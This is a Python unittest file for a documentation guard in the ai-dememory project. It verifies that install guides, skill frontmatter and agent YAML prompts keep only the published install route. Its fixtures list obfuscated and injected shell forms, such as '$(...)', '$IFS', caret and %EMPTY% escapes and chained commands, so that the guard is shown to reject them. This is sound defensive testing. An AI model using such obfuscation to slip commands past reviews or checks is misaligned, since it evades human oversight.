from __future__ import annotations

import re
import shlex
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from scripts.docs_site_guard import (
    REPO_ROOT,
    SITE_ROOT,
    NESTED_SHELL_MAX_DEPTH,
    ACTIVE_PRERELEASE_CONTRACTS,
    HISTORICAL_PRERELEASE_CONTRACTS,
    PUBLIC_SKILL_FIRST_RUN_GUIDES,
    PUBLIC_SKILL_GUIDE_ROOTS,
    PUBLIC_SOURCE_ROUTE_DOCS,
    MCP_CLIENT_SMOKE_GUIDES,
    RELEASE_PENDING_CONTRACTS,
    RELEASE_SCOPE_DOCS,
    STABLE_DOC_REQUIRED_COMMANDS,
    STABLE_INSTALL_DOCS,
    STABLE_RELEASE_CONTRACTS,
    ACTIVE_PRERELEASE_REQUIRED_COMMANDS,
    _release_contract_errors,
    _pending_source_execution_errors,
    _mcp_client_smoke_command_errors,
    _stable_command_errors,
    audit_public_skill_guides,
    audit_site,
    public_skill_guide_required_commands,
    release_scope_markers,
    site_release_lens,
)


FUTURE_PENDING_VERSION = "2.1.2"
FUTURE_PENDING_CONTRACT = {
    "published_version": "2.1.1",
    "scope_markers": (
        "Source candidate: 2.1.2, unreleased",
        "not installable from a package index until it is tagged and published",
    ),
}


class DocumentationSiteGuardTests(unittest.TestCase):
    def _future_pending_contract(self):
        return patch.dict(
            RELEASE_PENDING_CONTRACTS,
            {FUTURE_PENDING_VERSION: FUTURE_PENDING_CONTRACT},
            clear=True,
        )

    def test_published_2_1_1_contract_is_wizard_first_without_a_runtime_pin(self) -> None:
        contract = STABLE_RELEASE_CONTRACTS["2.1.1"]

        self.assertIn("pipx install ai-dememory", contract["required"])
        self.assertIn("pipx install --force ai-dememory", contract["required"])
        self.assertIn(
            "ai-dememory init ~/code/my-memory --wizard",
            contract["required"],
        )
        self.assertIn(
            "ai-dememory --root ~/code/my-memory mcp-config --client codex",
            contract["required"],
        )
        self.assertEqual((), contract["source_only"])
        self.assertFalse(
            any("==" in command or "--require-version" in command for command in contract["required"])
        )

    def test_all_stable_wizard_guides_use_the_unpinned_first_run_command(self) -> None:
        command = "ai-dememory init ~/code/my-memory --wizard"
        for relative in (
            "README.md",
            "docs/install.md",
            "docs/local-mcp.md",
            "docs/mcp-client-config.md",
            "docs/codex-plugin.md",
            "docs/distribution.md",
            "docs/create-memory-repo.md",
            "docs/scheduler-plugin-blueprint.md",
        ):
            with self.subTest(path=relative):
                self.assertIn(command, STABLE_DOC_REQUIRED_COMMANDS[relative])

    def test_public_skill_surfaces_use_the_published_stable_route(self) -> None:
        expected = {
            "skills/ai-dememory/SKILL.md",
            "skills/ai-dememory/agents/openai.yaml",
            "plugins/ai-dememory/skills/memory-maintenance/SKILL.md",
            "plugins/ai-dememory/skills/memory-recall/SKILL.md",
            "plugins/ai-dememory/skills/memory-review-inbox/SKILL.md",
            "plugins/ai-dememory/skills/memory-setup/SKILL.md",
            "plugins/ai-dememory/skills/memory-working-session/SKILL.md",
        }
        discovered = {
            path.relative_to(REPO_ROOT).as_posix()
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS
            for path in (REPO_ROOT / relative_root).rglob("*")
            if path.is_file() and path.suffix.casefold() in {".json", ".md", ".yaml", ".yml"}
        }

        self.assertSetEqual(expected, discovered)
        first_run = (
            "pipx install ai-dememory",
            "ai-dememory init ~/code/my-memory --wizard",
        )
        stable_commands = public_skill_guide_required_commands("2.1.1", "2.1.1")
        self.assertSetEqual(set(PUBLIC_SKILL_FIRST_RUN_GUIDES), set(stable_commands))
        for relative in stable_commands:
            with self.subTest(path=relative):
                self.assertEqual(first_run, stable_commands[relative])
        self.assertEqual(
            [],
            audit_public_skill_guides(REPO_ROOT, "2.1.1", "2.1.1"),
        )

    def test_public_skill_first_run_contract_does_not_depend_on_release_identity(self) -> None:
        expected = (
            "pipx install ai-dememory",
            "ai-dememory init ~/code/my-memory --wizard",
        )
        self.assertEqual(
            {relative: expected for relative in PUBLIC_SKILL_FIRST_RUN_GUIDES},
            public_skill_guide_required_commands("2.1.1", "2.1.1"),
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            self.assertEqual(
                [],
                audit_public_skill_guides(copied, "2.1.1", "2.1.1"),
            )

    def test_public_skill_guard_rejects_a_persistent_wizard_gate_on_the_stable_line(self) -> None:
        unpinned = "ai-dememory init ~/code/my-memory --wizard"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            for relative in PUBLIC_SKILL_FIRST_RUN_GUIDES:
                with self.subTest(path=relative):
                    guide = copied / relative
                    guide.write_text(
                        guide.read_text(encoding="utf-8").replace(
                            unpinned,
                            f"{unpinned} --require-version 2.1.1",
                            1,
                        ),
                        encoding="utf-8",
                    )
                    errors = audit_public_skill_guides(copied, "2.1.1", "2.1.1")
                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and "stable documentation must not retain a persistent --require-version gate"
                            in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_guard_rejects_quoted_frontmatter_wizard_while_release_is_pending(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        replacement = (
            'description: "ai-dememory init ~/code/my-memory --wizard '
            '--require-version 2.1.1"'
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            guide.write_text(
                re.sub(
                    r"(?m)^description: .*$",
                    lambda _: replacement,
                    original,
                    count=1,
                ),
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "public skill frontmatter 'description' must not include an executable command"
                in error
                for error in errors
            ),
            errors,
        )

    def test_public_skill_guard_rejects_quoted_frontmatter_cli_command(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            guide.write_text(
                re.sub(
                    r"(?m)^description: .*$",
                    lambda _: 'description: "ai-dememory hooks install"',
                    original,
                    count=1,
                ),
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "public skill frontmatter 'description' must not include an executable command"
                in error
                for error in errors
            ),
            errors,
        )

    def test_public_skill_guard_rejects_folded_frontmatter_mcp_config_continuation(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            guide.write_text(
                re.sub(
                    r"(?m)^description: .*$",
                    lambda _: (
                        "description: >\n"
                        "  ai-dememory --root ~/code/my-memory mcp-config --client codex\n"
                        "  --require-version 2.1.1"
                    ),
                    original,
                    count=1,
                ),
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "frontmatter 'description' must use a single-line plain or quote-only scalar"
                in error
                for error in errors
            ),
            errors,
        )

    def test_public_skill_guard_rejects_unsupported_frontmatter_scalar_syntax(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        unsupported_values = (
            '["ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1"]',
            '"ai-dememory\\u002dinit ~/code/my-memory --wizard --require-version 2.1.1"',
            "!!str ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1",
            "*command",
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            for value in unsupported_values:
                with self.subTest(value=value):
                    guide.write_text(
                        re.sub(
                            r"(?m)^description: .*$",
                            lambda _: f"description: {value}",
                            original,
                            count=1,
                        ),
                        encoding="utf-8",
                    )
                    errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")
                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and "public skill frontmatter 'description'" in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_guard_rejects_dynamic_frontmatter_shell_syntax(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        dynamic_values = (
            '"$(ai-dememory init ~/code/my-memory --wizard)"',
            '"ai-dememory$IFS init ~/code/my-memory --wizard"',
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            for value in dynamic_values:
                with self.subTest(value=value):
                    guide.write_text(
                        re.sub(
                            r"(?m)^description: .*$",
                            lambda _: f"description: {value}",
                            original,
                            count=1,
                        ),
                        encoding="utf-8",
                    )
                    errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")
                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and "frontmatter 'description' must not use dynamic shell syntax" in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_guard_rejects_metadata_installer_and_python_dispatchers(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        command_values = (
            '"pipx install git+https://example.invalid/ai-dememory.git"',
            '"Run ai-dememory hooks install"',
            '"bash -c \'ai-dememory hooks install\'"',
            '"python3 -m ai_dememory_tool init ~/code/my-memory --wizard"',
            '"py -3 -m ai_dememory_tool init ~/code/my-memory --wizard"',
            '"python3 -u scripts/ai_dememory.py doctor"',
            '"py -3 -u scripts/ai_dememory.py doctor"',
            '"python3 -u -m scripts.ai_dememory doctor"',
            '"ai_dememory.py hooks install"',
            '"scripts/ai_dememory.py hooks install"',
            '"./scripts/ai_dememory.py hooks install"',
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            for value in command_values:
                with self.subTest(value=value):
                    guide.write_text(
                        re.sub(
                            r"(?m)^description: .*$",
                            lambda _: f"description: {value}",
                            original,
                            count=1,
                        ),
                        encoding="utf-8",
                    )
                    errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")
                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and "frontmatter 'description' must not include an executable command"
                            in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_metadata_allows_shell_prose(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        prose_values = (
            '"Bash users can run local diagnostics."',
            '"PowerShell users can inspect a vault."',
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            original = guide.read_text(encoding="utf-8")
            for value in prose_values:
                with self.subTest(value=value):
                    guide.write_text(
                        re.sub(
                            r"(?m)^description: .*$",
                            lambda _: f"description: {value}",
                            original,
                            count=1,
                        ),
                        encoding="utf-8",
                    )
                    self.assertEqual([], audit_public_skill_guides(copied, "2.1.0", "2.1.1"))

    def test_public_agent_yaml_rejects_quoted_bare_cli_command(self) -> None:
        relative = "skills/ai-dememory/agents/openai.yaml"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            agent_config = copied / relative
            original = agent_config.read_text(encoding="utf-8")
            agent_config.write_text(
                re.sub(
                    r"(?m)^  default_prompt: .*$",
                    lambda _: (
                        '  default_prompt: "ai-dememory init ~/code/my-memory --wizard '
                        '--require-version 2.1.1"'
                    ),
                    original,
                    count=1,
                ),
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "public agent YAML 'default_prompt' must not include an executable command"
                in error
                for error in errors
            ),
            errors,
        )

    def test_public_agent_yaml_rejects_skill_token_cli_continuation(self) -> None:
        relative = "skills/ai-dememory/agents/openai.yaml"
        continuations = (
            "$ai-dememory hooks install",
            "$ai-dememory init ~/code/my-memory --wizard --require-version 2.1.1",
            "$$ai-dememory hooks install",
        )
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            agent_config = copied / relative
            original = agent_config.read_text(encoding="utf-8")
            for continuation in continuations:
                with self.subTest(continuation=continuation):
                    agent_config.write_text(
                        re.sub(
                            r"(?m)^  default_prompt: .*$",
                            lambda _: f'  default_prompt: "{continuation}"',
                            original,
                            count=1,
                        ),
                        encoding="utf-8",
                    )

                    errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and (
                                "must not turn the $ai-dememory skill token into a CLI command"
                                in error
                                or "must not use dynamic shell syntax" in error
                            )
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_guard_rejects_unknown_yaml_schema(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/unexpected.yaml"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            unexpected = copied / relative
            unexpected.write_text("command: ai-dememory init ~/code/my-memory --wizard\n", encoding="utf-8")

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertIn(
            f"{relative}: public skill YAML is not an explicitly supported schema",
            errors,
        )

    def test_public_skill_guard_rejects_unknown_json_schema(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/unexpected.json"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            unexpected = copied / relative
            unexpected.write_text(
                '{"description": "ai-dememory init ~/code/my-memory --wizard"}\n',
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.0", "2.1.1")

        self.assertIn(
            f"{relative}: public skill JSON is not an explicitly supported schema",
            errors,
        )

    def test_source_routes_are_rejected_in_stable_user_sections(self) -> None:
        fixtures = (
            (
                "docs/local-mcp.md",
                "docker build -t alternate-image .",
                "source Docker build",
            ),
            (
                "docs/local-mcp.md",
                "docker image build .",
                "source Docker build",
            ),
            (
                "docs/local-mcp.md",
                "docker buildx build .",
                "source Docker build",
            ),
            (
                "docs/local-mcp.md",
                "docker compose build",
                "source Docker build",
            ),
            (
                "docs/local-mcp.md",
                "docker compose -f compose.yaml build",
                "source Docker build",
            ),
            (
                "docs/local-mcp.md",
                "docker-compose build",
                "source Docker build",
            ),
            (
                "docs/operations.md",
                "py -3 -u scripts/ai_dememory.py doctor",
                "source dispatcher",
            ),
            (
                "docs/operations.md",
                "python3 -u -m scripts.ai_dememory doctor",
                "source dispatcher",
            ),
            ("docs/install.md", "pip install .", "local source install"),
            ("docs/install.md", "pi\\\np install .", "local source install"),
            ("docs/install.md", "p^ip install .", "local source install"),
            ("docs/install.md", "p%EMPTY%ip install .", "local source install"),
            ("docs/scheduler.md", "do^cker build .", "source Docker build"),
            (
                "docs/local-mcp.md",
                "py^thon3 scripts/ai_dememory.py doctor",
                "source dispatcher",
            ),
            ("docs/install.md", "pip install -e .", "local source install"),
            ("docs/install.md", "pip install --editable=.", "local source install"),
            ("docs/install.md", "pip install -e=.", "local source install"),
            ("docs/install.md", "python3 -m pip install .", "local source install"),
            (
                "docs/install.md",
                "python3 -m pip install --editable=.",
                "local source install",
            ),
            ("docs/install.md", "pipx install .", "local source install"),
            ("docs/install.md", "pipx install -e=.", "local source install"),
            ("docs/install.md", "uv tool install .", "local source install"),
            ("docs/install.md", "uv tool install --editable=.", "local source install"),
            ("docs/install.md", "pip install file:.", "local source install"),
            ("docs/install.md", "pip install file:./", "local source install"),
            ("docs/install.md", "pip install $PWD", "local source install"),
            ("docs/install.md", "pip install ${PWD}", "local source install"),
            ("docs/install.md", "pip install $(pwd)", "local source install"),
            ("docs/install.md", "pip install %CD%", "local source install"),
            ("docs/install.md", "pip install $env:CD", "local source install"),
            ("docs/install.md", "poetry install", "local source install"),
            ("docs/install.md", "uv sync", "local source install"),
        )
        for relative, command, route in fixtures:
            with self.subTest(path=relative, command=command):
                text = f"# User path\n\n```sh\n{command}\n```\n"
                errors = _pending_source_execution_errors(
                    text,
                    "2.1.1",
                    "2.1.1",
                    relative,
                    allow_explicit_maintainer_sections=True,
                )
                self.assertTrue(
                    any(f"must not execute a {route}" in error for error in errors),
                    errors,
                )

    def test_source_routes_ignore_echo_but_not_later_segments(self) -> None:
        for command in (
            "echo python3 scripts/ai_dememory.py doctor",
            "echo docker build .",
        ):
            with self.subTest(command=command):
                self.assertEqual(
                    [],
                    _pending_source_execution_errors(
                        f"# User path\n\n```sh\n{command}\n```\n",
                        "2.1.1",
                        "2.1.1",
                        "docs/local-mcp.md",
                        allow_explicit_maintainer_sections=True,
                    ),
                )

        errors = _pending_source_execution_errors(
            "# User path\n\n```sh\necho docker build .; docker build .\n```\n",
            "2.1.1",
            "2.1.1",
            "docs/local-mcp.md",
            allow_explicit_maintainer_sections=True,
        )
        self.assertTrue(any("must not execute a source Docker build" in error for error in errors), errors)

    def test_dynamic_source_route_precheck_leaves_literal_prose_alone(self) -> None:
        prose = "The fragment p^ip install . is a cmd syntax example, not a copyable command."

        self.assertEqual(
            [],
            _pending_source_execution_errors(
                prose,
                "2.1.1",
                "2.1.1",
                "docs/install.md",
                allow_explicit_maintainer_sections=True,
            ),
        )

    def test_source_routes_remain_available_in_reviewed_maintainer_sections(self) -> None:
        for relative in (
            "docs/local-mcp.md",
            "docs/mcp-client-config.md",
            "docs/operations.md",
            "docs/codex-plugin.md",
        ):
            with self.subTest(path=relative):
                self.assertEqual(
                    [],
                    _pending_source_execution_errors(
                        (REPO_ROOT / relative).read_text(encoding="utf-8"),
                        "2.1.1",
                        "2.1.1",
                        relative,
                        allow_explicit_maintainer_sections=True,
                    ),
                )

    def test_mcp_client_smoke_guides_bind_a_separate_vault_and_absolute_source(self) -> None:
        for relative in MCP_CLIENT_SMOKE_GUIDES:
            with self.subTest(path=relative):
                self.assertEqual(
                    [],
                    _mcp_client_smoke_command_errors(
                        (REPO_ROOT / relative).read_text(encoding="utf-8"),
                        relative,
                    ),
                )

        unbound = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py mcp-client-smoke --command ai-dememory\n",
            "docs/example.md",
        )
        relative_root = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root . mcp-client-smoke "
            "--command ai-dememory\n",
            "docs/example.md",
        )
        relative_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3 --command-arg scripts/ai_dememory.py\n",
            "docs/example.md",
        )
        unprovable_variable_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3 --command-arg $CHECKOUT/scripts/ai_dememory.py\n",
            "docs/example.md",
        )
        missing_python_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3\n",
            "docs/example.md",
        )
        shadowed_python_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3 --command-arg /tmp/other.py "
            "--command-arg /opt/ai-dememory/scripts/ai_dememory.py\n",
            "docs/example.md",
        )
        python_code_before_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3 --command-arg=-c --command-arg pass "
            "--command-arg /opt/ai-dememory/scripts/ai_dememory.py\n",
            "docs/example.md",
        )
        literal_tilde_source = _mcp_client_smoke_command_errors(
            "python3 scripts/ai_dememory.py --root /tmp/vault mcp-client-smoke "
            "--command python3 --command-arg ~/code/ai-dememory/scripts/ai_dememory.py\n",
            "docs/example.md",
        )
        valid_py_launcher = _mcp_client_smoke_command_errors(
            "py -3 scripts/ai_dememory.py --root C:/Temp/vault mcp-client-smoke "
            "--command py --command-arg=-3.13 "
            "--command-arg C:/code/ai-dememory/scripts/ai_dememory.py\n",
            "docs/example.md",
        )

        self.assertTrue(any("requires exactly one" in error for error in unbound), unbound)
        self.assertTrue(any("requires exactly one" in error for error in relative_root), relative_root)
        self.assertTrue(any("must use an absolute" in error for error in relative_source), relative_source)
        self.assertTrue(
            any("must use an absolute" in error for error in unprovable_variable_source),
            unprovable_variable_source,
        )
        self.assertTrue(
            any("requires exactly one absolute" in error for error in missing_python_source),
            missing_python_source,
        )
        self.assertTrue(
            any("first program argument" in error for error in shadowed_python_source),
            shadowed_python_source,
        )
        self.assertTrue(
            any("first program argument" in error for error in python_code_before_source),
            python_code_before_source,
        )
        self.assertTrue(
            any("must use an absolute" in error for error in literal_tilde_source),
            literal_tilde_source,
        )
        self.assertEqual([], valid_py_launcher)

    def test_scheduler_source_diagnostics_stay_limited_to_the_exact_maintainer_heading(self) -> None:
        allowed = _pending_source_execution_errors(
            "# Scheduler\n\n### Maintainer-only Docker schedule diagnostics\n\n"
            "```bash\npython3 scripts/ai_dememory.py doctor\n```\n",
            "2.1.1",
            "2.1.1",
            "docs/scheduler.md",
            allow_explicit_maintainer_sections=True,
        )
        rejected = _pending_source_execution_errors(
            "# Scheduler\n\n## User path\n\n"
            "```bash\npython3 scripts/ai_dememory.py doctor\n```\n",
            "2.1.1",
            "2.1.1",
            "docs/scheduler.md",
            allow_explicit_maintainer_sections=True,
        )

        self.assertEqual([], allowed)
        self.assertTrue(any("must not execute a source dispatcher" in error for error in rejected), rejected)

    def test_full_audit_covers_the_curated_public_source_route_set(self) -> None:
        portal_user_product_guides = {
            "docs/README.md",
            "docs/local-api.md",
            "docs/hooks.md",
            "docs/schema.md",
            "docs/memory-quality.md",
            "docs/review-workflows.md",
            "docs/import-capture.md",
            "docs/source-grounded-query-design.md",
            "docs/sleep-consolidation.md",
            "docs/architecture.md",
            "docs/memory-graph.md",
            "docs/mcp-v2.md",
            "docs/mcp-v2-gap-analysis.md",
            "docs/public-modernization-roadmap.md",
        }
        expected_guides = {
            *STABLE_INSTALL_DOCS,
            "README-PYPI.md",
            *portal_user_product_guides,
        }
        self.assertSetEqual(set(PUBLIC_SOURCE_ROUTE_DOCS), expected_guides)

        guarded_routes = {
            relative: [("python3 scripts/ai_dememory.py doctor", "source dispatcher")]
            for relative in PUBLIC_SOURCE_ROUTE_DOCS
        }
        for relative in portal_user_product_guides:
            guarded_routes[relative].extend(
                (
                    ("pip install .", "local source install"),
                    ("p^ip install .", "local source install"),
                    ("p%EMPTY%ip install .", "local source install"),
                    ("pi\\\np install .", "local source install"),
                    ("docker build .", "source Docker build"),
                )
            )

        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary) / "repo"
            shutil.copytree(
                REPO_ROOT,
                copied,
                ignore=shutil.ignore_patterns(
                    ".git",
                    "__pycache__",
                    ".pytest_cache",
                ),
            )
            for relative, routes in guarded_routes.items():
                guide = copied / relative
                guide.write_text(
                    "# User route regression\n\n"
                    "```bash\n"
                    + "\n".join(command for command, _ in routes)
                    + "\n```\n\n"
                    + guide.read_text(encoding="utf-8"),
                    encoding="utf-8",
                )

            errors = audit_site(copied)

        for relative, routes in guarded_routes.items():
            for _, route in routes:
                with self.subTest(path=relative, route=route):
                    self.assertTrue(
                        any(
                            error.startswith(f"{relative}:")
                            and f"public user guidance must not execute a {route}" in error
                            for error in errors
                        ),
                        errors,
                    )

    def test_public_skill_guard_rejects_source_dispatcher(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            guide.write_text(
                guide.read_text(encoding="utf-8")
                + "\n```sh\npython3 scripts/ai_dememory.py doctor\n```\n",
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.1", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "public user guidance must not execute a source dispatcher" in error
                for error in errors
            ),
            errors,
        )

    def test_public_skill_guard_rejects_dynamic_source_installer(self) -> None:
        relative = "plugins/ai-dememory/skills/memory-setup/SKILL.md"
        with tempfile.TemporaryDirectory() as temporary:
            copied = Path(temporary)
            for relative_root in PUBLIC_SKILL_GUIDE_ROOTS:
                shutil.copytree(REPO_ROOT / relative_root, copied / relative_root)
            guide = copied / relative
            guide.write_text(
                guide.read_text(encoding="utf-8")
                + "\n```cmd\np^ip install .\n```\n",
                encoding="utf-8",
            )

            errors = audit_public_skill_guides(copied, "2.1.1", "2.1.1")

        self.assertTrue(
            any(
                error.startswith(f"{relative}:")
                and "must not execute a local source install through dynamic or fragmented shell syntax"
                in error
                for error in errors
            ),
            errors,
        )

    def test_release_scope_supports_source_equal_to_stable(self) -> None:
        self.assertEqual(
            release_scope_markers("2.1.1", "2.1.1"),
            ("current stable", "2.1.1"),
        )
        self.assertEqual(site_release_lens("2.1.1", "2.1.1"), "Stable release: 2.1.1")

    def test_release_scope_models_the_explicit_release_pending_source(self) -> None:
        with self._future_pending_contract():
            self.assertEqual("2.1.1", FUTURE_PENDING_CONTRACT["published_version"])
            self.assertNotIn("package_command", FUTURE_PENDING_CONTRACT)
            self.assertEqual(
                release_scope_markers("2.1.1", FUTURE_PENDING_VERSION),
                ("current stable", "2.1.1", *FUTURE_PENDING_CONTRACT["scope_markers"]),
            )
            self.assertEqual(
                site_release_lens("2.1.1", FUTURE_PENDING_VERSION),
                FUTURE_PENDING_CONTRACT["scope_markers"][0],
            )

    def test_future_source_still_requires_an_explicit_active_or_pending_contract(self) -> None:
        self.assertEqual(
            [
                "docs site guard: source differing from the published stable package "
                "requires exactly one explicit active TestPyPI prerelease contract or "
                "a release-pending contract"
            ],
            _release_contract_errors("2.1.1", "2.1.2rc1"),
        )

    def test_release_pending_source_requires_zero_active_prerelease_contracts(self) -> None:
        self.assertEqual(
            {FUTURE_PENDING_VERSION: FUTURE_PENDING_CONTRACT},
            RELEASE_PENDING_CONTRACTS,
        )
        self.assertEqual({}, ACTIVE_PRERELEASE_CONTRACTS)
        self.assertEqual((), ACTIVE_PRERELEASE_REQUIRED_COMMANDS)
        with self._future_pending_contract(), patch.dict(
            ACTIVE_PRERELEASE_CONTRACTS,
            {"2.1.2rc1": {"scope_marker": "test fixture"}},
            clear=True,
        ):
            errors = _release_contract_errors("2.1.1", FUTURE_PENDING_VERSION)

        self.assertEqual(
            [
                "docs site guard: release-pending source must not retain an active "
                "TestPyPI prerelease contract"
            ],
            errors,
        )

    def test_rc2_is_retained_as_historical_evidence_not_an_active_package_route(self) -> None:
        historical = HISTORICAL_PRERELEASE_CONTRACTS["2.1.1rc2"]
        self.assertEqual(
            historical["status_evidence"],
            (
                "v2.1.1rc2",
                "https://test.pypi.org/project/ai-dememory/2.1.1rc2/",
                "https://github.com/GonzaloTorreras/ai-dememory/releases/tag/v2.1.1rc2",
            ),
        )
        self.assertEqual("historical prerelease evidence", historical["status_marker"])
        self.assertNotIn("2.1.1rc2", ACTIVE_PRERELEASE_CONTRACTS)
        errors = _stable_command_errors(
            "python -m pip install --index-url https://test.pypi.org/simple/ ai-dememory==2.1.1rc2",
            "2.1.1",
            "fixture",
            source_version="2.1.1",
        )
        self.assertTrue(any("not allowlisted" in error for error in errors), errors)

    def test_stable_user_docs_keep_only_the_published_wizard_first_route(self) -> None:
        for relative in STABLE_INSTALL_DOCS:
            with self.subTest(path=relative):
                text = (REPO_ROOT / relative).read_text(encoding="utf-8")
                self.assertEqual(
                    [],
                    _stable_command_errors(
                        text,
                        "2.1.1",
                        relative,
                        source_version="2.1.1",
                    ),
                )

        for relative in RELEASE_SCOPE_DOCS:
            with self.subTest(scope_path=relative):
                text = " ".join(
                    (REPO_ROOT / relative).read_text(encoding="utf-8").lower().split()
                ).replace("`", "")
                self.assertIn("current stable", text)
                self.assertIn("2.1.1", text)
                self.assertNotIn("testpypi prerelease 2.1.1rc2", text)
                self.assertNotIn("source candidate 2.1.1rc2 is unreleased", text)

        install = (REPO_ROOT / "docs/install.md").read_text(encoding="utf-8")
        self.assertIn("ai-dememory init ~/code/my-memory --wizard", install)
        self.assertNotIn("--require-version", install)
        self.assertNotIn("ai-dememory==", install)
        self.assertNotIn(
